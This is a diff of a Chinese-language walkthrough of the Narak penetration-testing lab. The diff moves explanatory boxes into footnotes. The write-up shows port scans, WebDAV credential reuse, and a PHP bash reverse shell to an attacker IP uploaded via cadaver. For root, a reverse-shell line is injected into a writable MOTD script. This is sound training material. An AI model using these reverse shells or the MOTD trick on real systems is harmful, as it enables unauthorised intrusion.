@@ -84,7 +84,7 @@ sudo nmap -sT -sV -sC -v -O -p22,80 --min-rate 10000 192.168.xxx.132 -oA narakDe
 
 扫描结果如下：
 
-![扫描结果](https://raw.githubusercontent.com/Catsofsuffering/PicGoBed/main/KK_CKOL090%60H%7EAD%251MNIAJI.png)
+![扫描结果](https://pic.imgdb.cn/item/64b2d7241ddac507cc2fcbca.jpg)
 
 接着用UDP协议进行探测：
 
@@ -101,68 +101,10 @@ sudo nmap -sU --top-port 20 --min-rate 10000 192.168.xxx.132
 
 ![UDP扫描结果](https://pic.imgdb.cn/item/647c13a9f024cca173274d06.png)
 
-从 UDP 扫描结果可以发现，靶机似乎存在 TFTP 服务，但是目前没有利用点，继续向下走。
+从 UDP 扫描结果可以发现，靶机似乎存在 TFTP 服务<sup>[①](#TFTP-获取关键文件)</sup>，但是目前没有利用点，继续向下走。
 
-### TFTP获取关键文件
-
-{% hideToggle TFTP 服务 %}
-TFTP是**简单文件传输协议**（Trivial File Transfer Protocol）的缩写，它是一种用来在客户机和服务器之间进行简单文件传输的协议。它提供不复杂、开销不大的文件传输服务，使用UDP协议在端口号69建立网络连接。它的一个主要用途是在局域网中的节点启动时进行文件传输。TFTP不需要用户登录，也不支持重命名或删除文件。TFTP通常只适用于局域网使用，因为它没有安全或保密机制。
-
-使用TFTP传输文件需要有一个TFTP客户端和一个TFTP服务器。TFTP客户端可以用命令行或图形界面的方式操作，TFTP服务器需要安装和配置相应的软件。不同的操作系统有不同的方法，这里以Linux和Windows为例。
-
-在Linux系统中，可以使用tftp命令来传输文件。tftp命令的语法是：
-
-``` bash
-tftp [主机名称或IP地址]
-```
-
-例如，要连接到远程服务器218.28.188.288，可以输入：
-
-``` bash
-tftp 218.28.188.288
-```
-
-连接成功后，可以使用以下命令来传输文件：
-
-- put：上传文件到服务器
-- get：从服务器下载文件
-- quit：退出tftp
-- help：显示帮助信息
-
-例如，要从服务器下载根目录下的文件README，可以输入：
-
-``` bash
-get README
-```
-
-在Windows系统中，需要先开启TFTP客户端的功能，方法是：
-
-- 打开控制台，点击应用程序。
-- 在“应用程序与功能”窗口，往下滑到底部点击“程序和功能->开启与关闭Windows功能”。
-- 在“Windows功能”窗口中，勾选“TFTP客户端”，可能需要重新启动电脑才能完成设置。
-
-开启后，可以在命令提示符中输入tftp命令来传输文件。tftp命令的语法是：
-
-``` bash
-tftp -p -l 本地文件路径 服务器IP地址（上传文件）
-tftp -g -r 服务器文件路径 服务器IP地址（下载文件）
-```
-
-例如，要上传本地文件 `c:\\User\\Administrator\\Download` 到服务器 `1.2.3.4` ，可以输入：
-
-``` bash
-tftp -p -l c:\\User\\Administrator\\Download 1.2.3.4
-```
-
-要从服务器下载文件data.txt到当前目录，可以输入：
-
-``` bash
-tftp -g -r data.txt 1.2.3.4
-```
 
 ### gobuster 爆破目录
-
-{% endhideToggle %}
 
 之后用 gobuster 爆破目录，字典用的 dirbuster 带的字典，~~属实是NTR了。~~
 
@@ -178,24 +120,6 @@ sudo gobuster dir -u 192.168.xxx.132 -w /usr/share/dirbuster/wordlists/directory
 
 ![Webdav服务](https://pic.imgdb.cn/item/647c13a8f024cca173274c85.png)
 
-{% hideToggle 什么是 Webdav 服务 %}
-Webdav 服务是一种基于 HTTP 协议的文件共享服务，它可以让应用程序直接对 Web 服务器进行读写操作，并支持文件的锁定和版本控制。Webdav 服务的应用场景有：
-
-- 在不同的设备和平台上同步和备份文件，如使用坚果云、 OneDrive 等支持 Webdav 协议的网盘。
-- 在移动端访问和编辑云端的文档、笔记、日程等，如使用 iWork、GoodReader 、Notability 等支持 Webdav 协议的应用。
-- 在远程服务器上管理和传输文件，如使用 RaiDrive 、WinSCP 等支持 Webdav 协议的工具。
-
-要使用 Webdav 服务，需要有一个 Webdav 客户端和一个 Webdav 服务器。 Webdav 客户端可以是浏览器、文件管理器、应用程序等，Webdav 服务器可以是网盘、NAS 、VPS 等。要建立连接，需要知道服务器的**地址、端口、用户名和密码**。连接成功后，就可以像操作本地文件一样操作远程文件了。
-
-要搭建一个 Webdav 服务器，可以使用 Windows 自带的 IIS 服务，也可以使用 Apache 、Nginx 等开源软件，或者使用专门的 Webdav 软件。
-
-webdav服务漏洞是指一些利用webdav服务的特性或者缺陷来进行攻击的漏洞。webdav是一种基于HTTP协议的文件管理协议，允许用户通过web服务器来创建、修改、删除和移动文件。webdav服务漏洞的类型和影响有：
-
-- webdav 目录遍历漏洞：利用 webdav 服务对 URL 解码的不完整性，可以绕过目录限制，访问或者修改任意文件，甚至执行任意代码。
-- webdav PUT 方法漏洞：利用 webdav 服务支持的 PUT 方法，可以上传任意文件到 web 服务器上，如果没有正确的权限控制和过滤，可能导致任意代码执行或者信息泄露。
-- webdav PROPFIND 方法漏洞：利用 webdav 服务支持的 PROPFIND 方法，可以获取 web 服务器上的文件和目录信息，如果没有正确的权限控制和过滤，可能导致信息泄露或者拒绝服务。
-- webdav NTLM 认证绕过漏洞：利用 webdav 服务对 NTLM 认证的不正确处理，可以绕过身份验证，访问或者修改受保护的资源。
-{% endhideToggle %}
 
 {% note danger %}
 注意：gobuster 默认不扫描 `zip` , `rar` , `sql` , `txt` 文件，因此需要用 `-x` 参数指定
@@ -222,11 +146,9 @@ get creds.txt
 
 登录 Webdav ，结果发现没有任何可利用的文件，想到能不能写入文件，从 kali 的工具手册找到 Devtest 工具。
 
-{% blockquote Kali Docs https://www.kali.org/tools/davtest/ %}
-DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.
-{% endblockquote %}
+>DAVTest tests WebDAV enabled servers by uploading test executable files, and then (optionally) uploading files which allow for command execution or other actions directly on the target. It is meant for penetration testers to quickly and easily determine if enabled DAV services are exploitable.
 
-Devtest 这个工具就是用来测试 WebDAV 有哪些文件允许上传，并且能够上传 shell 文件。
+`Devtest` 这个工具就是用来测试 WebDAV 有哪些文件允许上传，并且能够上传 shell 文件。
 
 ``` bash
 sudo davtest -auth yamdoot:Swarg -cleanup -url http://192.168.118.132/webdav
@@ -242,17 +164,16 @@ sudo davtest -auth yamdoot:Swarg -cleanup -url http://192.168.118.132/webdav
 <?php exec("\bin\bash -c 'bash -i >& /dev/tcp/192.168.xxx.130/ 0>&1'");?>
 ```
 
-{% blockquote Kali Docs https://www.kali.org/tools/cadaver/%}
-cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking.
 
-Its operation is similar to the standard BSD ftp(1) client and the Samba Project’s smbclient(1).
+>cadaver supports file upload, download, on-screen display, in-place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking.
+>
+>Its operation is similar to the standard BSD ftp(1) client and the Samba Project’s smbclient(1).
+>
+>This package includes GnuTLS (HTTPS) support.
+>
+>WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
 
-This package includes GnuTLS (HTTPS) support.
-
-WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
-{% endblockquote %}
-
-cadaver 是一个可以用来访问和编辑web服务器上的文件的工具，kali 系统中默认装有此软件，因此用 cadaver 通过之前活得的用户名与密码，写入 `shell.php` 上传，使用 nc 监听端口，然后请求 `http://192.168.xxx.132/webdav/shell.php`：
+`cadaver` 是一个可以用来访问和编辑web服务器上的文件的工具，kali 系统中默认装有此软件，因此用 cadaver 通过之前活得的用户名与密码，写入 `shell.php` 上传，使用 nc 监听端口<sup>[②](#nc参数含义)</sup>，然后请求 `http://192.168.xxx.132/webdav/shell.php`：
 
 ``` bash
 echo "<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.xxx.130/2333 0>&1'");?>" > shell.php
@@ -260,16 +181,6 @@ cadaver http://192.168.xxx.132/webdav # then enter User ID and passwd
 put /path/to/shell.php
 nc -lvnp 2333
 ```
-{% hideToggle nc参数含义 %}
-
-反弹shell中经常回用到netcat这个工具，以下是`-lvnp`参数的含义：
-
-`-l` ：表示监听模式，使 nc 在指定的端口上监听传入连接。
-`-v` ：表示详细模式（verbose mode），它会显示更多关于连接的信息，例如连接的来源等。
-`-n` ：表示禁用主机名解析，这意味着 nc 不会尝试将 IP 地址解析为主机名。
-`-p` ：后面跟着端口号，表示要监听的端口号。
-
-{% endhideToggle %}
 
 可以看到已经回弹 shell 了，是 `www-data` 用户
 
@@ -298,19 +209,7 @@ find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null
 
 ![提权1](https://pic.imgdb.cn/item/647c13a9f024cca173274e70.png)
 
-首先查看 `/mnt/hell.sh` 文件，通过查询资料发现是 Brainfuck 加密。
-
-{% hideToggle Brainfuck 加密 %}
-
-Brainfuck 是一种极简的编程语言，它由一系列简单的指令组成，用于操作一个字节大小的内存单元。由于其简单性，Brainfuck 并不是一个特别适合用于加密的编程语言。然而，你可以使用 Brainfuck 来进行简单的加密操作。
-
-在 Brainfuck 中，你可以编写一段程序来对文本进行加密。加密的基本思想是通过改变字符的 ASCII 值来隐藏原始文本。你可以使用一系列的加减操作来修改字符的 ASCII 值，并将加密后的结果输出。
-
-解密过程是加密过程的逆操作。通过对加密后的文本进行逆向的加减操作，你可以还原出原始的文本。
-
-然而，需要注意的是，Brainfuck加密非常简单，容易被破解。这种加密方式主要用于学习和娱乐目的，而不是用于实际的安全通信。如果你需要更强大和安全的加密算法，请使用专门的加密库或算法，如AES或RSA。
-
-{% endhideToggle %}
+首先查看 `/mnt/hell.sh` 文件，通过查询资料发现是 Brainfuck 加密<sup>[③](#Brainfuck-加密)</sup>。
 
 ```
 www-data@ubuntu:/var/www/webdav$ cat /mnt/hell.sh
@@ -329,11 +228,9 @@ echo"Highway to Hell";
 chitragupt    
 ```
 
-{% blockquote Kali man-db %}
-Beef is a flexible interpreter for the Brainfuck programming language.
+>Beef is a flexible interpreter for the Brainfuck programming language.
 It  can  be configured using the options described below, making it possible to run Brainfuck programs that make assumptions about the behavior of the interpreter.
 Beef sets no arbitrary limit to the size of the memory tape used by the program, and allocates memory cells as they are needed.
-{% endblockquote %}
 
 ~~在这卡了很久，还是打靶太少了。~~
 
@@ -405,7 +302,7 @@ applicable law.
 inferno@ubuntu:~$ 
 ```
 
-实际上到这已经没思路了，于是翻看了一下大师傅的 WriteUp 视频，发现大师傅是通过 MOTD 来进行提权的。
+实际上到这已经没思路了，于是翻看了一下大师傅的 WriteUp 视频，发现大师傅是通过 MOTD 来进行提权的<sup>[④](#motd-介绍 )</sup>。
 
 ```
 inferno@ubuntu:~$ ll /etc/update-motd.d/
@@ -420,17 +317,7 @@ drwxr-xr-x 80 root root 4096 Sep 22  2020 ../
 -rwxrwxrwx  1 root root  299 May 18  2017 91-release-upgrade*
 ```
 
-{% blockquote motd 介绍 %}
-在 Linux 中，MOTD（Message of the Day）是指在用户登录系统时显示的一条信息或欢迎消息。 MOTD 通常用于向用户提供系统公告、警告、重要通知或其他相关信息。
-
-MOTD 消息通常存储在一个文件中，可以通过编辑该文件来自定义 MOTD 内容。在大多数 Linux 发行版中， MOTD 文件的位置是 `/etc/motd` 。在打开的 MOTD 文件中，可以输入自定义的欢迎消息或其他所需的信息。保存并关闭文件后，新的 MOTD 将在下次用户登录时显示。
-
-某些 Linux 发行版可能还有其他方式来管理 MOTD ，例如使用 `/etc/update-motd.d/` 目录中的脚本来生成 MOTD 。这些脚本可以在每次用户登录时**动态**生成 MOTD 消息。
-
-无论使用哪种方法， MOTD 提供了一种在用户登录系统时向其显示重要信息的方式，以便提供必要的通知和提示。
-{% endblockquote %}
-
-根据上述的介绍，可以知道 MOTD 是动态生成的，所以我们直接进入 `/etc/update-motd.d/` 目录，在 `00-header` 文件中添加反弹 shell ：
+根据注释，可以知道 MOTD 是动态生成的，所以我们直接进入 `/etc/update-motd.d/` 目录，在 `00-header` 文件中添加反弹 shell ：
 
 ``` bash
 bash -c "bash -i >& /dev/tcp/192.168.118.130/2333 0>&1"
@@ -491,3 +378,109 @@ __________________________________
 ## 参考文献
 
 [「红队笔记」靶机精讲：Narak](https://www.bilibili.com/video/BV1R84y1w7MK/?vd_source=a8f71b037b12c218162155c04e3741e1)
+
+## 注释
+
+### TFTP 获取关键文件
+
+TFTP 是**简单文件传输协议**（Trivial File Transfer Protocol）的缩写，它是一种用来在客户机和服务器之间进行简单文件传输的协议。它提供不复杂、开销不大的文件传输服务，使用 UDP 协议在端口号69建立网络连接。它的一个主要用途是在局域网中的节点启动时进行文件传输。TFTP 不需要用户登录，也不支持重命名或删除文件。TFTP 通常只适用于局域网使用，因为它没有安全或保密机制。
+
+使用 TFTP 传输文件需要有一个 TFTP 客户端和一个 TFTP 服务器。TFTP 客户端可以用命令行或图形界面的方式操作，TFTP 服务器需要安装和配置相应的软件。不同的操作系统有不同的方法，这里以 Linux 和 Windows 为例。
+
+在 Linux 系统中，可以使用 tftp 命令来传输文件。tftp 命令的语法是：
+
+``` bash
+tftp [主机名称或IP地址]
+```
+
+例如，要连接到远程服务器218.28.188.288，可以输入：
+
+``` bash
+tftp 218.28.188.288
+```
+
+连接成功后，可以使用以下命令来传输文件：
+
+- put：上传文件到服务器
+- get：从服务器下载文件
+- quit：退出tftp
+- help：显示帮助信息
+
+例如，要从服务器下载根目录下的文件README，可以输入：
+
+```
+get README
+```
+
+在 Windows 系统中，需要先开启TFTP客户端的功能，方法是：
+
+- 打开控制台，点击应用程序。
+- 在“应用程序与功能”窗口，往下滑到底部点击“程序和功能->开启与关闭Windows功能”。
+- 在“Windows功能”窗口中，勾选“TFTP客户端”，可能需要重新启动电脑才能完成设置。
+
+开启后，可以在命令提示符中输入tftp命令来传输文件。tftp 命令的语法是：
+
+``` bash
+tftp -p -l 本地文件路径 服务器IP地址（上传文件）
+tftp -g -r 服务器文件路径 服务器IP地址（下载文件）
+```
+
+例如，要上传本地文件 `c:\\User\\Administrator\\Download` 到服务器 `1.2.3.4` ，可以输入：
+
+``` bash
+tftp -p -l c:\\User\\Administrator\\Download 1.2.3.4
+```
+
+要从服务器下载文件data.txt到当前目录，可以输入：
+
+``` bash
+tftp -g -r data.txt 1.2.3.4
+```
+
+### Webdav 服务
+
+Webdav 服务是一种基于 HTTP 协议的文件共享服务，它可以让应用程序直接对 Web 服务器进行读写操作，并支持文件的锁定和版本控制。Webdav 服务的应用场景有：
+
+- 在不同的设备和平台上同步和备份文件，如使用坚果云、 OneDrive 等支持 Webdav 协议的网盘。
+- 在移动端访问和编辑云端的文档、笔记、日程等，如使用 iWork、GoodReader 、Notability 等支持 Webdav 协议的应用。
+- 在远程服务器上管理和传输文件，如使用 RaiDrive 、WinSCP 等支持 Webdav 协议的工具。
+
+要使用 Webdav 服务，需要有一个 Webdav 客户端和一个 Webdav 服务器。 Webdav 客户端可以是浏览器、文件管理器、应用程序等，Webdav 服务器可以是网盘、NAS 、VPS 等。要建立连接，需要知道服务器的**地址、端口、用户名和密码**。连接成功后，就可以像操作本地文件一样操作远程文件了。
+
+要搭建一个 Webdav 服务器，可以使用 Windows 自带的 IIS 服务，也可以使用 Apache 、Nginx 等开源软件，或者使用专门的 Webdav 软件。
+
+webdav服务漏洞是指一些利用webdav服务的特性或者缺陷来进行攻击的漏洞。webdav是一种基于HTTP协议的文件管理协议，允许用户通过web服务器来创建、修改、删除和移动文件。webdav服务漏洞的类型和影响有：
+
+- webdav 目录遍历漏洞：利用 webdav 服务对 URL 解码的不完整性，可以绕过目录限制，访问或者修改任意文件，甚至执行任意代码。
+- webdav PUT 方法漏洞：利用 webdav 服务支持的 PUT 方法，可以上传任意文件到 web 服务器上，如果没有正确的权限控制和过滤，可能导致任意代码执行或者信息泄露。
+- webdav PROPFIND 方法漏洞：利用 webdav 服务支持的 PROPFIND 方法，可以获取 web 服务器上的文件和目录信息，如果没有正确的权限控制和过滤，可能导致信息泄露或者拒绝服务。
+- webdav NTLM 认证绕过漏洞：利用 webdav 服务对 NTLM 认证的不正确处理，可以绕过身份验证，访问或者修改受保护的资源。
+
+### nc参数含义
+
+反弹shell中经常回用到netcat这个工具，以下是`-lvnp`参数的含义：
+
+`-l` ：表示监听模式，使 nc 在指定的端口上监听传入连接。
+`-v` ：表示详细模式（verbose mode），它会显示更多关于连接的信息，例如连接的来源等。
+`-n` ：表示禁用主机名解析，这意味着 nc 不会尝试将 IP 地址解析为主机名。
+`-p` ：后面跟着端口号，表示要监听的端口号。
+
+### Brainfuck 加密
+
+Brainfuck 是一种极简的编程语言，它由一系列简单的指令组成，用于操作一个字节大小的内存单元。由于其简单性，Brainfuck 并不是一个特别适合用于加密的编程语言。然而，你可以使用 Brainfuck 来进行简单的加密操作。
+
+在 Brainfuck 中，你可以编写一段程序来对文本进行加密。加密的基本思想是通过改变字符的 ASCII 值来隐藏原始文本。你可以使用一系列的加减操作来修改字符的 ASCII 值，并将加密后的结果输出。
+
+解密过程是加密过程的逆操作。通过对加密后的文本进行逆向的加减操作，你可以还原出原始的文本。
+
+然而，需要注意的是，Brainfuck加密非常简单，容易被破解。这种加密方式主要用于学习和娱乐目的，而不是用于实际的安全通信。如果你需要更强大和安全的加密算法，请使用专门的加密库或算法，如AES或RSA。
+
+### motd 介绍 
+
+在 Linux 中，MOTD（Message of the Day）是指在用户登录系统时显示的一条信息或欢迎消息。 MOTD 通常用于向用户提供系统公告、警告、重要通知或其他相关信息。
+
+MOTD 消息通常存储在一个文件中，可以通过编辑该文件来自定义 MOTD 内容。在大多数 Linux 发行版中， MOTD 文件的位置是 `/etc/motd` 。在打开的 MOTD 文件中，可以输入自定义的欢迎消息或其他所需的信息。保存并关闭文件后，新的 MOTD 将在下次用户登录时显示。
+
+某些 Linux 发行版可能还有其他方式来管理 MOTD ，例如使用 `/etc/update-motd.d/` 目录中的脚本来生成 MOTD 。这些脚本可以在每次用户登录时**动态**生成 MOTD 消息。
+
+无论使用哪种方法， MOTD 提供了一种在用户登录系统时向其显示重要信息的方式，以便提供必要的通知和提示。
